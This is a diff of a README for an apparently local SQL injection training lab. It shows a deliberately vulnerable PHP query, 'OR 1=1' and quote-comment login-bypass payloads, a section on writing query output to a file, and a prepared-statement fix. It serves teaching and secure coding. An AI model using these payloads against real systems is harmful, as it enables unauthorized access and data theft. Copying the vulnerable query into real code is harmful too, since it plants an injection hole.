@@ -5,16 +5,16 @@ Learn how to exploit SQL injection (SQLi) in a vulnerable web application to byp
 
 ---
 
-## 🛠️ Tools Used  
+## 🛠Tools Used  
 - Apache Web Server  
 - PHP login form (`index.php`)  
 - Firefox (localhost)  
 - Terminal (vi editor, gedit)  
-- Kali Linux / Ubuntu
+- Kali Linux / VMware
 
 ---
 
-## 🧪 Lab Setup & Navigation
+## Lab Setup & Navigation
 
 ```bash
 cd /var/www
@@ -37,12 +37,12 @@ http://localhost/sqlinjection/index.php
 
 ---
 
-## 🔍 Vulnerable SQL Code (Inside `index.php`)
+## Vulnerable SQL Code (Inside `index.php`)
 ```php
 $sql = "SELECT * FROM students WHERE uid = $_GET['uid']";
 ```
 
-🚨 This is vulnerable: directly inserting unsanitized user input.
+- This is vulnerable: directly inserting unsanitized user input.
 
 If user inputs:
 ```
@@ -52,11 +52,11 @@ The query becomes:
 ```sql
 SELECT * FROM students WHERE uid = 2019 OR 1=1;
 ```
-✅ Returns all students (authentication bypassed).
+- Returns all students (authentication bypassed).
 
 ---
 
-## 🧪 Manual SQL Injection Payloads
+## Manual SQL Injection Payloads
 
 | Input                    | Purpose                        |
 |-------------------------|--------------------------------|
@@ -67,7 +67,7 @@ SELECT * FROM students WHERE uid = 2019 OR 1=1;
 
 ---
 
-## 🔓 Login Bypass Scenarios
+## Login Bypass Scenarios
 
 **If username is known but password is not:**  
 - Input this in **Password** field:  
@@ -81,11 +81,11 @@ SELECT * FROM students WHERE uid = 2019 OR 1=1;
   ' OR '1'='1'#
   ```
 
-✅ This logs you in as the first user in the database.
+- This logs you in as the first user in the database.
 
 ---
 
-## 💾 Writing Output to File (Advanced SQLi)
+## Writing Output to File (Advanced SQLi)
 
 **Payload:**
 ```sql
@@ -104,11 +104,11 @@ ls /tmp/
 sudo gedit /tmp/sql.txt
 ```
 
-⚠️ Works only if MySQL has **FILE** privilege and permission to write to `/tmp`.
+⚠- Works only if MySQL has **FILE** privilege and permission to write to `/tmp`.
 
 ---
 
-## 🧠 Useful SQLi Payloads
+## Useful SQLi Payloads
 
 | Payload                                                     | Purpose                           |
 |-------------------------------------------------------------|-----------------------------------|
@@ -122,16 +122,16 @@ sudo gedit /tmp/sql.txt
 
 ---
 
-## 🛡️ Secure Coding – Prevention
+## Secure Coding – Prevention
 
-✅ Use **prepared statements**:
+### Use **prepared statements**:
 ```php
 $stmt = $pdo->prepare("SELECT * FROM students WHERE uid = :uid");
 $stmt->bindParam(':uid', $_GET['uid']);
 $stmt->execute();
 ```
 
-📌 Additional protection:
+### Additional protection:
 - Validate and sanitize input  
 - Escape special characters  
 - Disable error details on production  
